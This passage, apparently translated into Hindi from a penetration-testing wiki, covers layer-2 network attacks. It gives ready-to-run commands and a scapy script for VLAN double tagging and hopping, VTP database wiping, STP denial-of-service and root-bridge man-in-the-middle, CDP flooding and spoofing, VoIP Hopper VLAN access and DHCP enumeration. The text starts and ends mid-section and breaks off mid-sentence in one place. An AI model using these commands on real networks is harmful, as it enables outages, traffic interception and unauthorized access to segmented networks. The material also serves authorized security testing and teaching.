рдпрджрд┐ рд╡рд╣ рдкреАрдбрд╝рд┐рдд рд╕реЗ рдХреБрдЫ рдкреИрдХреЗрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (635) (1).png>)

рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк scapy рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### рд▓реЗрдЯрд░рд▓ VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдмрд╛рдпрдкрд╛рд╕ <a href="#d679" id="d679"></a>

рдпрджрд┐ рдЖрдкрдХреЗ **рдбрд╛рдпрд░реЗрдХреНрдЯрд▓реА рдХрдиреЗрдХреНрдЯреЗрдб рд╕реНрд╡рд┐рдЪ рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдПрдХреНрд╕реЗрд╕** рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ **VLAN рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрддреА рд╣реИред рдмрд╕ **рдкреЛрд░реНрдЯ рдХреЛ рдЯреНрд░рдВрдХ рдореЛрдб рдореЗрдВ рд╕реНрд╡рд┐рдЪ рдХрд░реЗрдВ** (рдЬрд┐рд╕реЗ рдЯреНрд░рдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ), рд▓рдХреНрд╖рд┐рдд VLANs рдХреЗ рдЖрдИрдбреА рдХреЗ рд╕рд╛рде рд╡рд░реНрдЪреБрдЕрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рдмрдирд╛рдПрдВ, рдФрд░ рдПрдХ рдЖрдИрдкреА рдкрддрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВред рдЖрдк рдЖрдИрдкреА рдкрддрд╛ рдХрд╛ рдЕрдиреБрд░реЛрдз рдбрд╛рдпрдиреЗрдорд┐рдХ рд░реВрдк рд╕реЗ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдбреАрдПрдЪрд╕реАрдкреА) рдпрд╛ рдЖрдк рдЗрд╕реЗ рд╕реНрдерд┐рд░ рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдорд╛рдорд▓реЗ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### рд▓реЗрдпрд░ 3 рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN рдмрд╛рдпрдкрд╛рд╕

рдореЗрд╣рдорд╛рди рд╡рд╛рдпрд░рд▓реЗрд╕ рдиреЗрдЯрд╡рд░реНрдХ рдФрд░ рдЕрдиреНрдп рд╡рд╛рддрд╛рд╡рд░рдгреЛрдВ рдореЗрдВ, рдкреНрд░рд╛рдЗрд╡реЗрдЯ VLAN (рдЬрд┐рд╕реЗ _рдкреЛрд░реНрдЯ рдЖрдЗрд╕реЛрд▓реЗрд╢рди_ рдХреЗ рд░реВрдк рдореЗрдВ рднреА рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ) рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ **рдкреАрдпрд░реНрд╕ рдХреЛ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЕрд░реНрдерд╛рдд, рдХреНрд▓рд╛рдЗрдВрдЯ **рдПрдХ рд╡рд╛рдпрд░рд▓реЗрд╕ рдПрдХреНрд╕реЗрд╕ рдкреЙрдЗрдВрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рддреЗ рд╣реИрдВ рд▓реЗрдХрд┐рди рдПрдХ рджреВрд╕рд░реЗ рдХреЛ рдкрддрд╛ рдирд╣реАрдВ рд▓рдЧрд╛ рд╕рдХрддреЗ** рд╣реИрдВ)ред рдиреЗрдЯрд╡рд░реНрдХ ACLs (рдпрд╛ рдЙрдирдХреА рдЕрднрд╛рд╡) рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдПрдХ рд░рд╛рдЙрдЯрд░ рддрдХ рдЖрдИрдкреА рдкреИрдХреЗрдЯ рднреЗрдЬрдирд╛ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рдлрд┐рд░ рдПрдХ рдкрдбрд╝реЛрд╕реА рдкреАрдпрд░ рдХреЛ рд╡рд╛рдкрд╕ рднреЗрдЬ рджреЗрддрд╛ рд╣реИред

рдЗрд╕ рд╣рдорд▓реЗ рдореЗрдВ рдПрдХ **рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдкреИрдХреЗрдЯ рдХреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдЖрдИрдкреА рдкрддреЗ рдкрд░ рднреЗрдЬреЗрдВ рд▓реЗрдХрд┐рди рд░рд╛рдЙрдЯрд░ рдХреЗ рдореИрдХ рдкрддреЗ рдХреЗ рд╕рд╛рде**ред рдлрд┐рд░, **рд░рд╛рдЙрдЯрд░ рдкреИрдХреЗрдЯ рдХреЛ рдХреНрд▓рд╛рдЗрдВрдЯ рдХреЗ рдкрд╛рд╕ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛**ред рдбрдмрд▓ рдЯреИрдЧрд┐рдВрдЧ рд╣рдорд▓реЛрдВ рдХреА рддрд░рд╣ рдЖрдк рдЗрд╕ рд╡рдВрд╢рд╛рдиреБрдЧрддрддрд╛ рдХрд╛ рд╢рд┐рдХрд╛рд░ рдПрдХ рд╣реЛрд╕реНрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдХреЗ рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢рд┐рдХрд╛рд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### VTP рд╣рдорд▓реЗ

**VTP (VLAN Trunking Protocol)** рдПрдХ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ рдЬреЛ VLANs рдХреЛ рдХреЗрдВрджреНрд░реАрдп рд░реВрдк рд╕реЗ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рд╡рд░реНрддрдорд╛рди VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХрд╛ рдЯреНрд░реИрдХ рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рд┐рдЪреЗрд╕ рд╡рд┐рд╢реЗрд╖ рд╕рдВрд╢реЛрдзрди рд╕рдВрдЦреНрдпрд╛рдПрдБ рдЬрд╛рдВрдЪрддреЗ рд╣реИрдВред рдЬрдм рднреА рдХреЛрдИ рддрд╛рд▓рд┐рдХрд╛ рдЕрдкрдб
```bash
yersinia -G #For graphic mode
```
рдЕрдЧрд░ рдЖрдк рдкреВрд░реЗ VLAN рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдорд┐рдЯрд╛рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ **рд╕рднреА VTP VLAN рд╣рдЯрд╛рдиреЗ** рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ

<figure><img src="../../.gitbook/assets/image (22) (2).png" alt=""><figcaption></figcaption></figure>

### STP рд╣рдорд▓реЗ

**рдпрджрд┐ рдЖрдк рдЕрдкрдиреЗ рдЗрдВрдЯрд░рдлреЗрд╕ рдкрд░ BPDU рдлреНрд░реЗрдо рдХреИрдкреНрдЪрд░ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ, рддреЛ STP рд╣рдорд▓реЗ рдореЗрдВ рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рдЕрд╕рдВрднрд╛рд╡ рд╣реИред**

#### **STP BPDU рдбреАрдУрдПрд╕**

рдмрд╣реБрдд рд╕рд╛рд░реЗ BPDUs TCP (рдЯреЛрдкреЛрд▓реЙрдЬреА рдЪреЗрдВрдЬ рдиреЛрдЯрд┐рдлрд┐рдХреЗрд╢рди) рдпрд╛ Conf (рдЬрдм рдЯреЛрдкреЛрд▓реЙрдЬреА рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ рддреЛ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ BPDUs) рднреЗрдЬрдХрд░ рд╕реНрд╡рд┐рдЪ рдХреЛ рдУрд╡рд░рд▓реЛрдб рдХрд░ рджреЗрддреЗ рд╣реИрдВ рдФрд░ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдирд╛ рдмрдВрдж рдХрд░ рджреЗрддреЗ рд╣реИрдВред
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP рд╣рдорд▓рд╛**

рдЬрдм рдПрдХ TCP рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕реНрд╡рд┐рдЪреЛрдВ рдХреА CAM рддрд╛рд▓рд┐рдХрд╛ 15 рд╕реЗрдХрдВрдб рдореЗрдВ рд╣рдЯрд╛ рджреА рдЬрд╛рдПрдЧреАред рдлрд┐рд░, рдпрджрд┐ рдЖрдк рд▓рдЧрд╛рддрд╛рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯ рднреЗрдЬ рд░рд╣реЗ рд╣реИрдВ, рддреЛ CAM рддрд╛рд▓рд┐рдХрд╛ рд▓рдЧрд╛рддрд╛рд░ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рд╣реЛ рдЬрд╛рдПрдЧреА (рдпрд╛ рд╣рд░ 15 рд╕реЗрдХрдВрдб рдореЗрдВ) рдФрд░ рдЬрдм рдпрд╣ рдкреБрдирдГ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрддреА рд╣реИ, рддреЛ рд╕реНрд╡рд┐рдЪ рд╣рдм рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд░рддрд╛ рд╣реИред
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP рд░реВрдЯ рд╣рдорд▓рд╛**

рд╣рдорд▓рд╛рд╡рд╛рджреА рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ STP рд░реВрдЯ рдмрдирдиреЗ рдХреЗ рд▓рд┐рдП рд╕реНрд╡рд┐рдЪ рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддрд╛ рд╣реИред рдлрд┐рд░, рдЕрдзрд┐рдХ рдбреЗрдЯрд╛ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЧреБрдЬрд░реЗрдЧрд╛ред рдпрд╣ рджреЛ рд╡рд┐рднрд┐рдиреНрди рд╕реНрд╡рд┐рдЪреЛрдВ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ рджрд┐рд▓рдЪрд╕реНрдк рд╣реЛрддрд╛ рд╣реИред\
рдЗрд╕реЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рд░реВрдЯ рд╕реНрд╡рд┐рдЪ рдХреА рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рд╕реЗ рдХрдо рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рдорд╛рди рдХрд░ BPDUs CONF рдкреИрдХреЗрдЯ рднреЗрдЬрдХрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**рдЕрдЧрд░ рд╣рдорд▓рд╛рд╡рд░ 2 рд╕реНрд╡рд┐рдЪ рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реИ, рддреЛ рд╡рд╣ рдирдП рдкреЗрдбрд╝ рдХреА рдЬрдбрд╝ рдмрди рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рджреЛрдиреЛрдВ рд╕реНрд╡рд┐рдЪ рдХреЗ рдмреАрдЪ рдХрд╛ рд╕рднреА рдЯреНрд░реИрдлрд┐рдХ рдЙрд╕рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реЛрдЧрд╛** (рдПрдХ MITM рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛)ред
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP рд╣рдорд▓реЗ

CISCO рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ CISCO рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рдЙрдирдХреЗ рдмреАрдЪ рдмрд╛рддрдЪреАрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рд╣реИ, **рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХреМрди рдЬреАрд╡рд┐рдд рд╣реИ** рдФрд░ рдЙрдирдХреЗ рдкрд╛рд╕ рдХреМрди рд╕реА рд╕реБрд╡рд┐рдзрд╛рдПрдВ рд╣реИрдВред

#### рд╕реВрдЪрдирд╛ рдПрдХрддреНрд░реАрдХрд░рдг <a href="#0e0f" id="0e0f"></a>

**рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, CDP рд╕рднреА рдЕрдкрдиреЗ рдкреЛрд░реНрдЯреЛрдВ рдХреЛ рдШреЛрд╖рдгрд╛рдПрдБ рднреЗрдЬрддрд╛ рд╣реИред** рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдХреЛрдИ рдЕрддрд┐рдХреНрд░рдордгрдХрд╛рд░реА рд╕реНрд╡рд┐рдЪ рдкрд░ рдПрдХ рдкреЛрд░реНрдЯ рд╕реЗ рдХрдиреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рддреЛ рдХреНрдпрд╛ рд╣реЛрдЧрд╛? рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдирд┐рдлрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдЪрд╛рд╣реЗ рд╡рд╣ **Wireshark,** **tcpdump** рдпрд╛ **Yersinia** рд╣реЛ, рд╡рд╣ **рдЙрдкрдХрд░рдг рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдореВрд▓реНрдпрд╡рд╛рди рдЬрд╛рдирдХрд╛рд░реА** рдирд┐рдХрд╛рд▓ рд╕рдХрддрд╛ рд╣реИ, рдЙрд╕рдХреЗ рдореЙрдбрд▓ рд╕реЗ рд▓реЗрдХрд░ Cisco IOS рд╕рдВрд╕реНрдХрд░рдг рддрдХред рдЗрд╕ рдЬрд╛рдирдХрд╛рд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд╣ Cisco IOS рдХрд╛ рдПрдХ рд╣реА рд╕рдВрд╕реНрдХрд░рдг рдЧрдгрдирд╛ рдХрд░ рд╕рдХреЗрдЧрд╛ рдФрд░ рдлрд┐рд░ рдЙрд╕рдореЗрдВ рдЦреЛрдЬ рдХрд░ рд╕рдХреЗрдЧрд╛ рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рд╢рд╛рд░рдг рдХрд░ рд╕рдХреЗрдЧрд╛ред

#### CDP рдлреНрд▓рдбрд┐рдВрдЧ рд╣рдорд▓рд╛ <a href="#0d6a" id="0d6a"></a>

рдЖрдк рд╡рд╛рд╕реНрддрд╡рд┐рдХ CISCO рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ рдЕрдиреБрдХрд░рдг рдХрд░рдХреЗ рдбрд┐рд╡рд╛рдЗрд╕ рдореЗрдореЛрд░реА рдХреЛ рдЦрддреНрдо рдХрд░рдХреЗ рдПрдХ CISCO рд╕реНрд╡рд┐рдЪ рдкрд░ рдбреЛрдПрд╕ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```bash
sudo yersinia cdp -attack 1 #DoS Attack simulating new CISCO devices
# Or you could use the GUI
sudo yersinia -G
```
рд╡рд┐рдХрд▓реНрдк **рдлреНрд▓рдбрд┐рдВрдЧ рд╕реАрдбреАрдкреА рддрд╛рд▓рд┐рдХрд╛** рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░реЗрдВред рд╕реНрд╡рд┐рдЪ CPU рдУрд╡рд░рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛, рд╕рд╛рде рд╣реА рд╕реАрдбреАрдкреА рдкрдбрд╝реЛрд╕реА рддрд╛рд▓рд┐рдХрд╛ рднреА, **рдЬрд┐рд╕рд╕реЗ тАЬрдиреЗрдЯрд╡рд░реНрдХ рд╡рд┐рд▓рдВрдмтАЭ рд╣реЛрдЧрд╛ред**

<figure><img src="../../.gitbook/assets/image (1) (5) (1).png" alt=""><figcaption></figcaption></figure>

#### CDP рдЕрдиреБрд░реВрдкрдг рд╣рдорд▓рд╛
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
рдЖрдк [**scapy**](https://github.com/secdev/scapy/) рдХрд╛ рдЙрдкрдпреЛрдЧ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред `scapy/contrib` рдкреИрдХреЗрдЬ рдХреЗ рд╕рд╛рде рдЗрд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдиреЗ рдХрд╛ рдзреНрдпрд╛рди рд░рдЦреЗрдВред

### VoIP рд╣рдорд▓реЗ

рд╣рд╛рд▓рд╛рдВрдХрд┐ рдХрд░реНрдордЪрд╛рд░рд┐рдпреЛрдВ рдХреЗ рд╡реЙрдпрд╕ рдУрд╡рд░ рдЗрдВрдЯрд░рдиреЗрдЯ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (VoIP) рдлреЛрди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЖрдзреБрдирд┐рдХ VoIP рдЙрдкрдХрд░рдг рдЖрдИрдУрдЯреА рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд╕рд╛рде рдмрдврд╝рддреЗ рд░рд╣ рд░рд╣реЗ рд╣реИрдВред рдЕрдм рдХрдИ рдХрд░реНрдордЪрд╛рд░реА рдПрдХ рд╡рд┐рд╢реЗрд╖ рдлреЛрди рдирдВрдмрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджрд░рд╡рд╛рдЬреЗ рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рдХрдорд░реЗ рдХреЗ рдерд░реНрдореЛрд╕реНрдЯреИрдЯ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ...

рдЙрдкрдХрд░рдг [**voiphopper**](http://voiphopper.sourceforge.net) Cisco, Avaya, Nortel, рдФрд░ Alcatel-Lucent рд╡рд╛рддрд╛рдиреБрдХреВрд▓рди рдореЗрдВ рдПрдХ VoIP рдлреЛрди рдХреЗ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рддрд╛ рд╣реИред рдпрд╣ рд╕реНрд╡рдд: рд╕рд╣реА VLAN ID рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг рдЦреЛрдЬ рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореЗрдВ рд╕реЗ рдПрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рд╕рд┐рд╕реНрдХреЛ рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (CDP), рдбрд╛рдпрдирд╛рдорд┐рдХ рд╣реЛрд╕реНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдкреНрд░реЛрдЯреЛрдХреЙрд▓ (DHCP), рд▓рд┐рдВрдХ рд▓реЗрдпрд░ рдбрд┐рд╕реНрдХрд╡рд░реА рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдореАрдбрд┐рдпрд╛ рдПрдВрдбрдкреЙрдЗрдВрдЯ рдбрд┐рд╕реНрдХрд╡рд░реА (LLDP-MED), рдФрд░ 802.1Q ARPред

**VoIP Hopper** **рддреАрди** CDP рдореЛрдб рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред **рд╕реНрдирд┐рдл** рдореЛрдб рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ рдФрд░ VLAN ID рдХреЛ рдвреВрдВрдврдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ `0` рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред **рд╕реНрдкреВрдл** рдореЛрдб рд╡рд╛рд╕реНрддрд╡рд┐рдХ VoIP рдЙрдкрдХрд░рдг рджреНрд╡рд╛рд░рд╛ рдХреЙрд░реНрдкреЛрд░реЗрдЯ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдкреНрд░рд╕рд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрд╕реНрдЯрдо рдкреИрдХреЗрдЯ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **`1`** рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред рдкреВрд░реНрд╡-рддреИрдпрд╛рд░ рдкреИрдХреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реНрдкреВрдл рдореЛрдб рдПрдХ Cisco 7971G-GE IP рдлреЛрди рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╣реА рдкреИрдХреЗрдЯ рднреЗрдЬрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, **`-c`** рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ **`2`** рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВред

рд╣рдо рдЖрдЦрд┐рд░реА рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рд╕рдмрд╕реЗ рддреЗрдЬ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реИред **`-i`** рдкреИрд░рд╛рдореАрдЯрд░ рдЕрдЯреИрдХрд░ рдХрд╛ **рдиреЗрдЯрд╡рд░реНрдХ рдЗрдВрдЯрд░рдлреЗрд╕** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ, рдФрд░ **`-E`** рдкреИрд░рд╛рдореАрдЯрд░ **рдирдХрд▓реА рд╡реЙрдпрд╕ рдУрд╡рд░ рдЖрдИрдкреА рдЙрдкрдХрд░рдг рдХрд╛ рдирд╛рдо** рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рд╣рдордиреЗ SEP001EEEEEEEEE рдирд╛рдо рдХрд╛ рдЪрдпрди рдХрд┐рдпрд╛, рдЬреЛ рд╕рд┐рд╕реНрдХреЛ рдирд╛рдордХрд░рдг рдкреНрд░рд╛рд░реВрдк рдХреЗ рд▓рд┐рдП рд╕рдВрдЧрдд рд╣реИред рд╡реИрд╢реНрд╡рд┐рдХ рдкрд░рд┐рд╡реЗрд╢реЛрдВ рдореЗрдВ, рдЖрдк рдлреЛрди рдХреЗ рдкреАрдЫреЗ MAC рд▓реЗрдмрд▓ рджреЗрдЦрдХрд░ рдПрдХ рдореМрдЬреВрджрд╛ VoIP рдЙрдкрдХрд░рдг рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ; рдлреЛрди рдХреЗ рдкреНрд░рджрд░реНрд╢рди рд╕реНрдХреНрд░реАрди рдкрд░ рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдмрдЯрди рджрдмрд╛рдХрд░ рдФрд░ рдореЙрдбрд▓ рдЬрд╛рдирдХрд╛рд░реА рд╡рд┐рдХрд▓реНрдк рдХрд╛ рдЪрдпрди рдХрд░рдХреЗ; рдпрд╛ рдЕрдкрдиреЗ рд▓реИрдкрдЯреЙрдк рд╕реЗ VoIP рдЙрдкрдХрд░рдг рдХреА рдИрдерд░рдиреЗрдЯ рдХреЗрдмрд▓ рдХреЛ рдЬреЛрдбрд╝рдХрд░ рдФрд░ рд╡рд╛рдпрд░рд╢рд╛рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдХрд░рдг рдХреЗ CDP рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рджреЗрдЦрдХрд░ред
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
рдпрджрд┐ рдЯреВрд▓ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрддрд╛ рд╣реИ, **VLAN рдиреЗрдЯрд╡рд░реНрдХ рдЖрдХреНрд░рдордХ рдХреЗ рдбрд┐рд╡рд╛рдЗрд╕ рдХреЛ рдПрдХ IPv4 рдкрддрд╛ рд╕реМрдВрдкреЗрдЧрд╛**ред

### DHCP рд╣рдорд▓реЗ

#### рдЧрдгрдирд╛
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

